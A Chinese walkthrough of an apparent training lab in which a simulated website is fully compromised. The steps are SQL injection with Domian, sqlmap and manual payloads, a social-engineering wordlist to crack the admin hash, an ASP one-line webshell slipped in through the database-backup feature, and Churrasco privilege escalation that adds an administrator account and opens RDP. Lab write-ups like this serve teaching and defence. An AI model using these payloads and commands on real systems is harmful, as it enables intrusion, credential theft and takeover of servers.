<p>下面以明小子（Domian）与 SQLMap 为例进行演示，以上工具均在实验工具箱中的【注入工具】文件夹下。</p>
<h3 id="明小子（Domian）"><a href="#明小子（Domian）" class="headerlink" title="明小子（Domian）"></a>明小子（Domian）</h3><p><strong>明小子（Domian）</strong>是国内的一款 Web 应用程序综合渗透工具，有可视化图形界面，简单易用，在国内安全圈极负盛名。</p>
<p>打开工具，依次点击 <strong>SQL注入 -&gt; 批量扫描注入点 -&gt; 添加网址</strong>，填入主站 URL <code>http://www.test/ichunqiu/</code>，保存后点击 <strong>批量分析注入点</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-info.png" alt="domain-info"></p>
<p>分析完毕后，可见又是一堆数字型 SQL 注入，以第 3 个注入点为例，右键点击 <strong>检测注入</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-injectable.png" alt="domain-injectable"></p>
<p>接着会自动跳转至 <strong>SQL注入猜解检测</strong> 选项卡，再点击 <strong>开始检测</strong>，证实了 <code>http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102</code> 确实是一个可用的注入点：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-verification.png" alt="domain-verification"></p>
<p>确认可注入后，点击 <strong>猜解表名</strong> 后得到 3 张表，接着选中 <code>admin</code> 表，点击 <strong>猜解列名</strong> 后得到 3 个列名，在所有列名前打上钩，点解 <strong>猜解内容</strong> 后即可得到管理员的账号为 <code>linhai</code>，16 位的密码哈希值为 <code>d7e15730ef9708c0</code>。至此，通过明小子工具成功地获取了管理员的账号密码。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-result.png" alt="domain-result"></p>
<h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h3><p><a href="http://sqlmap.org/"><strong>SQLMap</strong></a> 是一款专注于自动化 SQL 注入检测的开源渗透工具，用 Python 脚本语言编写，能在装有 Python 2.6.x 与 Python 2.7.x 的系统上跨平台运行，支持对数十种常见数据库的检测，被誉为 SQL 注入领域的一大渗透神器。</p>
<p>由于 SQLMap 只支持命令行界面，且默认不支持批量扫描注入点，故其易用性不如明小子，但也丝毫不影响其渗透威力，反而还拥有更高的检测效率与更广的检测范围。SQLMap 作为渗透工程师常用且必备的工具，应当重点掌握。下面将列出渗透过程中常用的命令及用法，建议同时参考<a href="https://github.com/sqlmapproject/sqlmap/wiki">官方文档</a>。</p>
<p>（1）<code>python sqlmap.py -h</code>：查询帮助手册。<br>（2）<code>python sqlmap.py -u &lt;URL&gt;</code>：检测该 URL 是否存在注入（末尾记得写上查询参数）。<br>（3）<code>python sqlmap.py -u &lt;URL&gt; --dbs</code>：查询所有数据库名。<br>（4）<code>python sqlmap.py -u &lt;URL&gt; --current-db</code>：查询当前数据库名。<br>（5）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; --tables</code>：查询某数据库中的所有表名。<br>（6）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; --columns</code>：查询某数据表中的所有列名。<br>（7）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; -C &lt;column&gt; --dump</code>：查询某列中的所有数据。</p>
<p>以上是通过 GET 方式来检测注入点，并进行 SQL 注入读取数据库中数据的常规套路。<strong>注意一个特例：由于 Microsoft Access 数据库结构特殊，注入时不必通过（3）或（4）来查询数据库名，直接从（5）开始查询表名即可，<code>-D</code> 选项也可省去。</strong></p>
<blockquote>
<p>小贴士：为了避免在命令行界面输入中文进入【SQLMap】目录，因此使用前建议将【SQLMap】文件夹拷贝到 C 盘下。</p>
</blockquote>
<p>确保了命令行路径在【SQLMap】目录下后，根据（2）输入命令 <code>python sqlmap.py -u &quot;http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102&quot;</code>，若询问「已检测到后台数据库为 Microsoft Access，需要跳过对其他数据库的检测吗？」填 <code>Y</code>，询问「想对 Microsoft Access 进行更全面的测试吗？」填 <code>Y</code>，询问「想尝试用随机整数值进行测试吗？」填 <code>Y</code>，询问「已确认 <code>id</code> 参数可注入，还需检测其他参数？」填 <code>y</code>，询问「已确认 <code>titleid</code> 参数可注入，还需检测其他参数？」填 <code>y</code>，询问「请选择一个注入点？」填 <code>0</code>。<strong>注意：此处 URL 中包含两个请求参数，所以最好用双引号将 URL 括起来。</strong></p>
<blockquote>
<p>小贴士：以上操作是为了全面检验注入点，实际上找到一个注入点后，即可填 <code>N</code> 终止检测其他参数。为简化后续注入流程的叙述，在选择注入点时默认填 <code>0</code>。</p>
</blockquote>
<p>结果显示 <code>id</code> 与 <code>titleid</code> 参数均为<strong>基于布尔的盲注（boolean-based blind）</strong>，并且返回了一些服务器相关信息，如：服务器操作系统为 <strong>Windows 2003 或 Windows XP</strong>，Web 应用程序采用了 <strong>APS.NET、Microsoft IIS 6.0、ASP</strong> 等建站技术，后端数据库数理系统为 <strong>Microsoft Access</strong>。以上对服务器相关信息的收集有助于后续更高效精准的渗透。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-info.png" alt="sqlmap-info"></p>
<p>知道了后端数据库是 Microsoft Access 后，可以跳过（3）或（4）直接进行（5），输入命令 <code>python sqlmap.py -u &quot;http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102&quot; --tables</code>，若询问「需要检测常用表名是否存在？」填 <code>Y</code>，询问「需要的线程数量？」填最大值 <code>10</code>。等待扫描全部结束后，得到了包含 <code>admin</code> 表在内的 4 张表。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-tables.png" alt="sqlmap-tables"></p>
<p>继续执行（6）中的命令，输入 <code>python sqlmap.py -u &quot;http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102&quot; -T &quot;admin&quot; --columns</code>，若询问「需要检测常用列名是否存在？」填 <code>Y</code>，询问「需要的线程数量？」填最大值 <code>10</code>。等待扫描全部结束后，得到了 <code>admin</code> 与 <code>password</code> 等 3 个字段。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-columns.png" alt="sqlmap-columns"></p>
<p>最后执行（7）中的命令，输入 <code>python sqlmap.py -u &quot;http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102&quot; -T &quot;admin&quot; -C &quot;admin,password&quot; --dump</code>，等待其枚举完毕，若询问「需要临时保存结果的哈希值？」填 <code>N</code>，询问「需要用字典攻击来破解结果？」填 <code>n</code>，最终可得到管理员的账号密码。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/sqlmap-result.png" alt="sqlmap-result"></p>
<h2 id="SQL-手工注入"><a href="#SQL-手工注入" class="headerlink" title="SQL 手工注入"></a>SQL 手工注入</h2><p>除了会使用 SQL 自动化注入工具，手工注入也应该是渗透工程师的基本技能之一。下面仍旧针对上述注入点，演示手工注入获取 Access 数据库内容的全过程。详细指导可参考：</p>
<blockquote>
<p><a href="http://blog.csdn.net/geecky/article/details/51297268">asp+access sql手工注入步骤</a><br><a href="https://www.cnblogs.com/0nth3way/articles/7123033.html">access手工注入</a></p>
</blockquote>
<h3 id="Step-1：猜解表名"><a href="#Step-1：猜解表名" class="headerlink" title="Step 1：猜解表名"></a>Step 1：猜解表名</h3><p>在火狐浏览器打开存在注入点的页面，将 URL 改为 <code>http://www.test.ichunqiu/see.asp?id=480&amp;titleid=102 AND EXISTS(SELECT * FROM &lt;table&gt;)</code>，其中 <code>&lt;table&gt;</code> 为待猜解的表名，如果表名存在，页面将显示正常，否则出现异常。<strong>注意：如果管理员把库名、表名、列名更改得随机复杂，手工注入将变得非常困难。</strong></p>
<p>打开 HackBar 工具，我们对 <code>admin</code>、<code>news</code>、<code>config</code> 等常见表名进行猜解，发现均能正常显示：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-tables.png" alt="manual-tables"></p>
<h3 id="Step-2：猜解列数"><a href="#Step-2：猜解列数" class="headerlink" title="Step 2：猜解列数"></a>Step 2：猜解列数</h3><p>已知 <code>admin</code> 表存在后，接着猜解当前未知表的列数，用于后续的<a href="http://www.w3school.com.cn/sql/sql_union.asp">联合查询（UNION SELECT）</a>，因为<strong>联合查询的必要条件是每个查询的列数需要严格相等，并且有的数据库要求每列的数据类型也必须相同</strong>。</p>
<p>猜解列数最便捷的方法是利用 <a href="http://www.w3school.com.cn/sql/sql_orderby.asp"><strong>ORDER BY</strong></a> 语句的隐藏用法。一般来说，<code>ORDER BY &lt;column&gt;</code> 代表对 <code>&lt;column&gt;</code> 列进行升排序，而 <strong><code>ORDER BY &lt;column_order&gt;</code> 代表对第 <code>&lt;column_order&gt;</code> 列进行升排序</strong>。显然，<code>&lt;column_order&gt;</code> 的最大取值即为查询数据的列数，因此，当发现 <code>ORDER BY n</code> 与 <code>ORDER BY n+1</code> 的页面显示不同时，可判断当前查询数据的列数为 n。</p>
<p><strong>注意，只有在后端数据库的查询语句为 <code>SELECT * FROM admin</code> 时，当前查询数据的列数 n 才等于数据库 <code>admin</code> 的总列数。</strong>详情可参考：<a href="https://segmentfault.com/a/1190000002655427">sql注入之order by猜列数问题</a>。</p>
<p>经过简单测试，可以确定查询数据的列数为 2：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-num-true.png" alt="manual-num-true"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-num-false.png" alt="manual-num-false"></p>
<h3 id="Step-3：找出显位点"><a href="#Step-3：找出显位点" class="headerlink" title="Step 3：找出显位点"></a>Step 3：找出显位点</h3><p>下面要构造联合查询 <code>UNION SELECT 1,2,...,n FROM &lt;table&gt;</code> 找出显位点，其中列数为 n，表名为 <code>&lt;table&gt;</code>。<strong>注意：对于数据类型不兼容的数据库，以上方法会造成语句错误，此时需改为 <code>UNION SELECT null,null,...,null FROM &lt;table&gt;</code> 才能正常执行，但同时也失去了查找显位点的效果。</strong></p>
<blockquote>
<p>小贴士：查询结果中的某些数据会出现在当前页面，而这些数据对应的列称为<strong>显位点</strong>。</p>
</blockquote>
<p>由于目标数据库只有 2 列，简单测试后即可发现第 1 列为显位点：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-points.png" alt="manual-points"></p>
<h3 id="Step-4：猜解列名"><a href="#Step-4：猜解列名" class="headerlink" title="Step 4：猜解列名"></a>Step 4：猜解列名</h3><p>最后一步，就是用猜想的列名去替换显位点，如果猜想正确，则页面会显示数据内容，否则出现异常。我们对 <code>user</code>、<code>username</code>、<code>account</code>、<code>admin</code>、<code>pwd</code>、<code>password</code>、<code>key</code>、<code>credit</code> 等常见列名进行猜解，终于从 <code>admin</code>、<code>password</code> 两列中读取到管理员的账号密码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-admin.png" alt="manual-admin"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/manual-password.png" alt="manual-password"></p>
<h2 id="社工字典攻击"><a href="#社工字典攻击" class="headerlink" title="社工字典攻击"></a>社工字典攻击</h2><p>既然实验手册提示使用社工工具，那不妨对管理员「linhai」进行一次社工攻击。</p>
<p>将主站所有页面都浏览一遍，在页面底部均能发现以下信息：管理员的 QQ 号为 <strong>1957692</strong>，Email 为 <strong><a href="mailto:&#x6c;&#105;&#110;&#x68;&#97;&#105;&#48;&#56;&#x31;&#50;&#x40;&#x32;&#49;&#x63;&#110;&#46;&#x63;&#111;&#109;">&#x6c;&#105;&#110;&#x68;&#97;&#105;&#48;&#56;&#x31;&#50;&#x40;&#x32;&#49;&#x63;&#110;&#46;&#x63;&#111;&#109;</a></strong>，并由此推算出生日期是 <strong>8 月 21 日</strong>，还发现了主站的<strong>管理入口</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-email-qq.png" alt="linhai-email-qq"></p>
<p>还在 <strong>摄影论坛</strong> 选项卡中发现一个用 LeadBBS 搭建的论坛，习惯性地用账号 <code>admin</code> 与密码 <code>admin</code> 尝试登录，居然成功进去了（若尝试失败，直接注册一个账号也是能登录进去查看相关信息的），并在 <strong>论坛信息 -&gt; 论坛管理团队</strong> 中发现「linhai」为论坛管理人员：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-manager.png" alt="linhai-manager"></p>
<p> 点击「linhai」查看其相关信息，在 <strong>签名栏</strong> 中发现他生于唐山大地震，即 <strong>1976 年</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-born.png" alt="linhai-born"></p>
<p>以上是在网站上能挖掘到关于「linhai」的全部信息，接下来打开工具箱【社工辅助】中的<strong>亦思想社会工程学字典生成器</strong>，将收集的信息填入，点击 <strong>生成字典</strong>，在本目录下打开字典 <strong>mypass.txt</strong>，即可看到一系列密码的猜测值：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dict.png" alt="dict"></p>
<p>再打开【破解工具】-&gt;【MD5】中的 <strong>MD5Crack2</strong>，在 <strong>破解单个密文</strong> 栏中填入上文获取的密码哈希值 <code>d7e15730ef9708c0</code>，在 <strong>使用字典 -&gt; 字典一</strong> 中点击 <strong>浏览</strong>，选中刚才生成的社工字典（在 <strong>文件类型</strong> 中选择 <strong>文本文件(*.txt)</strong> 即可看到文本文件），点击 <strong>开始</strong>，成功破解后即可看到管理员的密码明文 <code>linhai19760812</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/md5crack2.png" alt="md5crack2"></p>
<p>由于模拟渗透环境的特殊性，该密码哈希值经常被提交至各大 MD5 破解网站，因此用在线的  <a href="http://www.dmd5.com/md5-decrypter.jsp">MD5解密工具</a> 也能得到管理员的密码明文：</p>
<blockquote>
<p>小贴士：一般来说，复杂的管理员密码，是很难通过在线破解立即查询到明文的，除非之前被提交查询过，这时只能通过其他手段获取密码明文。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/linhai-password.png" alt="linhai-password"></p>
<h1 id="0x02-LeadBBS-论坛可否获得-webshell？"><a href="#0x02-LeadBBS-论坛可否获得-webshell？" class="headerlink" title="0x02 LeadBBS 论坛可否获得 webshell？"></a>0x02 LeadBBS 论坛可否获得 webshell？</h1><p><strong>注意：上一节获取 <code>linhai</code> 账户的密码 <code>linhai19760812</code>，是用于登录主站管理后台的，不是用来登录论坛的，虽然「linhai」也是论坛管理员，但他的密码目前还未知。</strong>因此，我们继续用 <code>admin</code> 账户在论坛中搜刮漏洞，看看可否从论坛中获得 webshell。</p>
<p>浏览了整个论坛，发现只在 <strong>我的控制面板 -&gt; 修改用户资料</strong> 页面中有写入与上传功能。先尝试将一句话木马 <code>&lt;%Eval Request(&quot;cmd&quot;)%&gt;</code> 写入用户资料，不出意外的话 <code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code> 等符号均被转义为 <a href="http://www.w3school.com.cn/html/html_entities.asp">HTML 字符实体</a>，木马写入失败：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-html-entity.png" alt="bbs-html-entity"></p>
<p>再尝试上传图片功能，将 C 盘下的 <code>工具.ico</code> 改名为 <code>test.asp;gj.jpg</code>，目的是利用 IIS 解析漏洞，将图片解析为 ASP 脚本文件。点击 <strong>选择文件</strong>，选中 <code>test.asp;gj.jpg</code> 后点击 <strong>上传</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-uploading.png" alt="bbs-uploading"></p>
<p>发现文件被重新随机命名，因此想控制文件名利用解析漏洞，也以失败而告终：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/bbs-uploaded.png" alt="bbs-uploaded"></p>
<p>此外，笔者还用了 Burp Suite 工具抓包改包，试图构造畸形目录触发解析漏洞，但在图片上传的包中也没发现可控的上传路径，故尝试失败。有兴趣的读者可自行尝试，此处就不演示了。</p>
<p>用浏览器也没有搜索到 LeadBBS 有效的漏洞信息，不过，没有绝对安全的系统，有兴趣可以下载论坛源码进行审计，相信一定能找到突破口的。总之，目前暂时<strong>不可以</strong>从 LeadBBS 论坛获得 webshell，若各位找到了获得 webshell 的方法，笔者愿闻其详。</p>
<h1 id="0x03-SQL-Server-数据库-sa-账号的密码是？"><a href="#0x03-SQL-Server-数据库-sa-账号的密码是？" class="headerlink" title="0x03 SQL Server 数据库 sa 账号的密码是？"></a>0x03 SQL Server 数据库 sa 账号的密码是？</h1><p>点击在主站页面底部发现的 <strong>管理入口</strong>，用账号 <code>linhai</code> 与密码 <code>linhai19760812</code> 登录进入后台：</p>
<blockquote>
<p>小贴士：若 CMS 保留默认设置，即使主站页面没给出后台管理入口，也能通过后台扫描工具，或搜索该 CMS 的默认后台管理路径来获得。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-back.png" alt="login-back"></p>
<p>由于主站是个小众 CMS，在未能获取有效漏洞信息，以及没有对其代码审计的情况下，应该对所有页面中可能出现写入或上传漏洞的地方进行黑盒测试。下面以几个测试点为例，演示黑盒测试的过程。</p>
<h2 id="Failure-1：添加图片"><a href="#Failure-1：添加图片" class="headerlink" title="Failure 1：添加图片"></a>Failure 1：添加图片</h2><p>在 <strong>图片管理 -&gt; 添加图片</strong> 页面，发现可以上传图片，先将【我的文档】-&gt;【图片收藏】-&gt;【示例图片】目录中的 <code>Winter.jpg</code> 复制到 C 盘目录下，方便后续使用，然后在页面填写相关信息，并在 <strong>图片一</strong> 中选择 <code>Winter.jpg</code> 后点击 <strong>上传</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-add-picture.png" alt="backend-add-picture"></p>
<p>上传之后，在 <strong>管理图片</strong> 与 <strong>推荐组图</strong> 页面中均未能发现 <code>Winter.jpg</code>，由此推断添加图片功能被禁用了。</p>
<h2 id="Failure-2：文章管理"><a href="#Failure-2：文章管理" class="headerlink" title="Failure 2：文章管理"></a>Failure 2：文章管理</h2><p>在 <strong>系统管理 -&gt; 文章图片</strong> 页面，发现可以写入文章，遂尝试写入一句话木马：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-write-article.png" alt="backend-write-article"></p>
<p>写入之后，打开文章，同样发现 <code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code> 等符号均被转义为 HTML 字符实体，木马写入失败：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-write-article-escape.png" alt="backend-write-article-escape"></p>
<h2 id="Success：系统变量设置-备份数据库"><a href="#Success：系统变量设置-备份数据库" class="headerlink" title="Success：系统变量设置 + 备份数据库"></a>Success：系统变量设置 + 备份数据库</h2><p>在 <strong>设置管理 -&gt; 系统变量设置</strong> 页面，发现可以写入设置信息，以及上传图片。不过，在尝试写入一句话木马时，点击 <strong>设置</strong> 却得到了错误信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-setting-error.png" alt="backend-setting-error"></p>
<p>此路不通，心里莫名一紧，只剩下最后的上传图片功能了。点击 <strong>上传图片</strong>，选择 <code>Winter.jpg</code>，哟嘿，居然能成功上传：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-upload.png" alt="backend-upload"></p>
<p>带着一点小激动，继续点击 <strong>生成代码</strong>，发现图片的路径也给显示出来了：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-upload-path.png" alt="backend-upload-path"></p>
<p>这说明有戏啊！接着探索，在 <strong>数据管理 -&gt; 备份&#x2F;恢复数据库</strong> 页面发现，似乎能把指定文件通过备份转换为 ASP 脚本文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-default.png" alt="backend-backup-default"></p>
<p>二话不说，先试一波。从默认备份路径可看出，当前路径应该在 <code>/admin/</code> 下，所以数据库路径为 <code>upfiles/201841631359.jpg</code>，备份的数据库路径为 <code>upfiles/201841631359.asp</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-picture.png" alt="backend-backup-picture"></p>
<p>成功备份后，访问 URL <code>http://www.test.ichunqiu/admin/upfiles/201841631359.asp</code>，得到 ASP 脚本解析错误信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-backup-error.png" alt="backend-backup-error"></p>
<p>因为该 ASP 脚本是由图片文件转化而来，解析错误是理所当然啊！这也进一步证实：<strong>通过备份数据库可以将目标文件转换了 ASP 脚本</strong>。</p>
<p>找到方向后，开始制作图片马，不过注意，<strong>不能通过 <code>copy</code> 命令或文本编辑器将一句话木马附在真正的图片后，否则会出现解析错误。</strong>因此，必须将木马插在文本文件中，再把后缀名改成图片格式即可。为了图片马能成功上传，最好填充大量文本信息，为了使文本文件的大小更接近图片文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-trojan.png" alt="backend-trojan"></p>
<p>重复上述步骤，将图片马通过备份数据库转换成 ASP 脚本后，访问 URL <code>http://www.test.ichunqiu/admin/upfiles/201841637712.asp</code>，看到如下页面，说明图片马上传成功：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/backend-trojan-uploaded.png" alt="backend-trojan-uploaded"></p>
<h2 id="菜刀连接获取-webshell"><a href="#菜刀连接获取-webshell" class="headerlink" title="菜刀连接获取 webshell"></a>菜刀连接获取 webshell</h2><p>下面的操作相信大家已轻车熟路，在工具箱【webshell】目录下拔出<a href="http://www.zhongguocaidao.com/">中国菜刀</a>，在 <strong>添加SHELL</strong> 中填入目标 URL 与请求参数后保存：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-trojan.png" alt="chopper-trojan"></p>
<p>双击 shell 记录，成功连接网站的文件管理系统：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-file-manager.png" alt="chopper-file-manager"></p>
<p>然后搜索网站根目录下所有文件，查找有关 SQL Server 数据库的用户信息，最终在 <code>/conn_old.asp</code> 文件中发现账户 <code>sa</code> 的密码为 <code>linhai123456woaini</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-conn-old.png" alt="chopper-conn-old"></p>
<p><strong>注意：以上发现的 SQL Server 数据库账号密码，与主站目前在用的 Microsoft Access 数据库无任何关系，只是作为考察信息检索能力的题目而存在。从文件名亦可得知，这是主站连接数据库的旧配置信息。</strong></p>
<p>此外，在 <code>/db/</code> 目录下发现了数据库文件，可见 <code>bear.asp</code> 与 <code>bear.ldb</code> 同名，并且 <code>bear.asp</code> 占用空间较大，由此推测为 <code>bear.mdb</code> 的备份数据库文件。</p>
<blockquote>
<p>小贴士：<a href="https://support.microsoft.com/en-us/help/966848/what-is-an-ldb-file">.LDB</a> 文件是打开 Microsoft Access 数据库文件 .MDB 时自动创建与删除的数据信息锁定文件，一般与 .MDB 文件同名，且位于同一目录，用于存储用户名与主机名等相关信息。</p>
</blockquote>
<p>右击 <code>bear.asp</code> 将其下载至桌面，并改名为 <code>bear.mdb</code>。打开明小子注入工具，依次点击 <strong>数据库管理 -&gt; 文件 -&gt; 打开数据库</strong>，选中桌面上的 <code>bear.mdb</code> 文件后打开：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-open-bear-mdb.png" alt="domain-open-bear-mdb"></p>
<p>在数据库中发现了 <code>admin</code> 表，以及主站后台管理员「linhai」的账号密码，从而证实了 <code>bear.asp</code> 文件为主站的后台数据库。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/domain-bear-mdb.png" alt="domain-bear-mdb"></p>
<h1 id="0x04-目标服务器系统的管理员密码是？"><a href="#0x04-目标服务器系统的管理员密码是？" class="headerlink" title="0x04 目标服务器系统的管理员密码是？"></a>0x04 目标服务器系统的管理员密码是？</h1><p>终于到达最后一关：「获取目标服务器的管理员密码」，我们先倒推一下思路：<strong>获得服务器系统管理员权限 -&gt; 破解管理员的密码哈希值 -&gt; 上传提权工具 -&gt; 寻找上传点</strong>，因此首先要做的是确定上传点！</p>
<p>那么如何确定上传点呢？具有写权限的目录都可以作为上传点，在 C 盘下的每个目录尝试上传，发现 <code>C:\Inetpub</code>、<code>C:\RECYCLER</code>、<code>C:\wmpub</code> 三个目录具有写权限，其他目录均写入失败。下面演示以 <code>C:\wmpub</code> 作为上传点。</p>
<p>系统提权将利用 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0079"><strong>CVE-2009-0079</strong></a> 漏洞，采取 <strong>cmd.exe + Churrasco.exe + 3389.bat</strong> 的工具组合，其中 cmd.exe 是为了代替原服务器中权限受限的命令行交互环境，Churrasco.exe 是用于提权的漏洞利用工具（也可用 pr.exe 与 iis.exe 等提权工具代替），3389.bat 是打开 3389 端口及远程桌面服务的批处理脚本文件。</p>
<blockquote>
<p>小贴士：CVE-2009-0079 是 Microsoft Windows RPCSS 服务隔离的本地权限提升漏洞，收录于 Microsoft 安全公告 <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-012">MS09-012</a>，影响 <strong>Microsoft Windows Server 2003 SP2</strong> 等多个系统版本。</p>
</blockquote>
<p>首先将工具箱【提权工具】-&gt;【windows】目录中的三款工具，在菜刀的文件管理页面空白处，右键点击 <strong>上传文件</strong> 至服务器 <code>C:\wmpub</code> 目录下，接着右击 cmd.exe，选择 <strong>虚拟终端</strong> 进入到命令行交互界面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-upload.png" alt="chopper-upload"></p>
<p>输入 <code>systeminfo</code> 命令，获取服务器系统相关信息，得知系统为 Microsoft Windows Server 2003 Enterprise Edition SP2，且只安装了一个补丁程序，即可猜测该系统存在 CVE-2009-0079 漏洞：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/systeminfo.png" alt="systeminfo"></p>
<p>接着切换到 <code>C:\wmpub</code> 目录，输入 <code>churrasco &quot;net user ichunqiu key /add&quot;</code> 命令，添加一个名为 <code>ichunqiu</code>、密码为 <code>key</code> 的用户：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-user.png" alt="churrasco-user"></p>
<p>再输入 <code>churrasco &quot;net localgroup administrators ichunqiu /add&quot;</code>命令，将 <code>ichunqiu</code> 用户添加到 <code>administrators</code> 用户组：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-localgroup.png" alt="churrasco-localgroup"></p>
<blockquote>
<p>小贴士：可通过 <code>net user</code> 与 <code>net localgroup administrators</code> 查看命令是否执行成功。</p>
</blockquote>
<p>最后输入 <code>churrasco 3389</code> 命令，打开 3389 端口及远程桌面服务：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-3389.png" alt="churrasco-3389"></p>
